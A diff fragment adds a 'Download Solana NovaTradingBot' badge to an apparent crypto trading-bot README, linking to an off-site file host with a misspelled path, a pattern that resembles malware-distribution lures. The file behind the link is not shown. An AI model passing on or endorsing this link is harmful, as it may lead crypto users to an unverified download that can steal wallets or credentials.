@@ -14,3 +14,4 @@ Solana nova trading bot is the ultimate tool for Solana blockchain traders who s
 
 
 
+[![Download Solana NovaTradingBot](https://img.shields.io/badge/Download-Solana%20NovaTradingBot-blueviolet)](https://downeefiles.com/s/solnvatrdingbot)
